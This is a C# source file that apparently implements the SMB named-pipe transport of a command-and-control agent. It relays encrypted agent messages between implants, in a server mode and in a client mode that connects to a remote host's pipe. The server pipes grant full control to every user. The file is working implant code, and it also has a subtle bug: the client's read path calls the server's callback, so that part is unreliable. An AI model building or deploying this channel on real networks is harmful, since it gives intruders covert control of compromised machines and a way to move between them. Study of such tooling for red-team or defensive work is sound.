using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

class SmbCommModule : ICommModule
{
    ModuleMode Mode;
    ModuleStatus ModuleStatus;

    string Pipename;
    string ConnectHost;

    ConfigController Config;
    CryptoController Crypto;
    AgentMetadata Metadata;

    Queue<AgentMessage> Inbound = new Queue<AgentMessage>();
    Queue<AgentMessage> Outbound = new Queue<AgentMessage>();

    ManualResetEvent Status = new ManualResetEvent(false);

    public SmbCommModule(string pipename)
    {
        ModuleStatus = ModuleStatus.Starting;
        Pipename = pipename;
        Mode = ModuleMode.Server;
    }

    public SmbCommModule(string connectHost, string pipename)
    {
        ConnectHost = connectHost;
        Pipename = pipename;
        Mode = ModuleMode.Client;
    }

    public ModuleStatus GetStatus()
    {
        return ModuleStatus;
    }

    public void Init(ConfigController config, CryptoController crypto)
    {
        Config = config;
        Crypto = crypto;
    }

    public bool RecvData(out AgentMessage message)
    {
        if (Inbound.Count > 0)
        {
            message = Inbound.Dequeue();
            return true;
        }
        else
        {
            message = null;
            return false;
        }
    }

    public void SendData(AgentMessage message)
    {
        Outbound.Enqueue(message);
    }

    public void SetMetadata(AgentMetadata metadata)
    {
        Metadata = metadata;
    }

    public void Start()
    {
        ModuleStatus = ModuleStatus.Running;

        switch (Mode)
        {
            case ModuleMode.Client:
                StartClient();
                break;
            case ModuleMode.Server:
                StartServer();
                break;
            default:
                break;
        }
    }

    public void Stop()
    {
        switch (Mode)
        {
            case ModuleMode.Client:
                break;
            case ModuleMode.Server:
                break;
            default:
                break;
        }

        ModuleStatus = ModuleStatus.Stopped;
    }

    private void StartServer()
    {
        var ps = new PipeSecurity();

        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null),
            PipeAccessRights.FullControl, AccessControlType.Allow));

        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                Status.Reset();
                var pipe = new NamedPipeServerStream(Pipename, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 1024, 1024, ps);
                pipe.BeginWaitForConnection(new AsyncCallback(ServerConnectCallback), pipe);
                Status.WaitOne();

                Thread.Sleep(1000);
            }
        });
    }

    private void StartClient()
    {
        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                Status.Reset();
                var pipe = new NamedPipeClientStream(ConnectHost, Pipename, PipeDirection.InOut, PipeOptions.Asynchronous);
                pipe.Connect(5000);

                var outbound = new AgentMessage { Metadata = Metadata };

                if (Outbound.Count > 0)
                {
                    outbound = Outbound.Dequeue();
                }

                var dataToSend = Crypto.Encrypt(outbound);

                pipe.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(ClientWriteCallback), pipe);

                Status.WaitOne();

                Thread.Sleep(1000);
            }
        });
    }

    #region Server
    private void ServerConnectCallback(IAsyncResult ar)
    {
        Status.Set();

        var pipe = ar.AsyncState as NamedPipeServerStream;
        pipe.EndWaitForConnection(ar);

        var state = new CommStateObject
        {
            Worker = pipe
        };

        pipe.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ServerReadCallback), state);
    }

    private void ServerReadCallback(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var pipe = state.Worker as NamedPipeServerStream;

        var bytesRead = 0;

        try
        {
            bytesRead = pipe.EndRead(ar);
        }
        catch { }

        if (bytesRead > 0)
        {
            var data = ServerDataJuggle(bytesRead, pipe, state);

            if (Crypto.VerifyHMAC(data))
            {
                var inbound = Crypto.Decrypt<AgentMessage>(data);

                if (inbound != null)
                {
                    Inbound.Enqueue(inbound);
                }
            }
        }

        var outbound = new AgentMessage { Metadata = Metadata };

        if (Outbound.Count > 0)
        {
            outbound = Outbound.Dequeue();
        }

        var dataToSend = Crypto.Encrypt(outbound);

        pipe.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(ServerWriteCallback), pipe);
    }

    private void ServerWriteCallback(IAsyncResult ar)
    {
        var pipe = ar.AsyncState as NamedPipeServerStream;

        pipe.EndWrite(ar);
        pipe.Close();
    }

    private byte[] ServerDataJuggle(int bytesRead, NamedPipeServerStream stream, CommStateObject state)
    {
        var final = new byte[] { };

        var dataReceived = state.Buffer.TrimBytes();

        if (bytesRead == state.Buffer.Length)
        {
            if (state.SwapBuffer != null)
            {
                var tmp = state.SwapBuffer;
                state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
            }
            else
            {
                state.SwapBuffer = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
            }

            Array.Clear(state.Buffer, 0, state.Buffer.Length);
            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ServerReadCallback), state);
        }
        else
        {
            if (state.SwapBuffer != null)
            {
                final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
            }
            else
            {
                final = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
            }
        }

        return final.TrimBytes();
    }
    #endregion

    #region Client
    private void ClientWriteCallback(IAsyncResult ar)
    {
        Status.Set();

        var pipe = ar.AsyncState as NamedPipeClientStream;
        pipe.EndWrite(ar);

        var state = new CommStateObject
        {
            Worker = pipe
        };

        pipe.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ClientReadCallBack), state);
    }

    private void ClientReadCallBack(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var pipe = state.Worker as NamedPipeClientStream;

        var bytesRead = 0;

        try
        {
            bytesRead = pipe.EndRead(ar);
        }
        catch { }

        if (bytesRead > 0)
        {
            var data = ClientDataJuggle(bytesRead, pipe, state);

            if (Crypto.VerifyHMAC(data))
            {
                var inbound = Crypto.Decrypt<AgentMessage>(data);

                if (inbound != null)
                {
                    Inbound.Enqueue(inbound);
                }
            }
        }

        pipe.Close();
    }

    private byte[] ClientDataJuggle(int bytesRead, NamedPipeClientStream stream, CommStateObject state)
    {
        var final = new byte[] { };

        var dataReceived = state.Buffer.TrimBytes();

        if (bytesRead == state.Buffer.Length)
        {
            if (state.SwapBuffer != null)
            {
                var tmp = state.SwapBuffer;
                state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
            }
            else
            {
                state.SwapBuffer = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
            }

            Array.Clear(state.Buffer, 0, state.Buffer.Length);
            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ServerReadCallback), state);
        }
        else
        {
            if (state.SwapBuffer != null)
            {
                final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
            }
            else
            {
                final = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
            }
        }

        return final.TrimBytes();
    }
    #endregion
}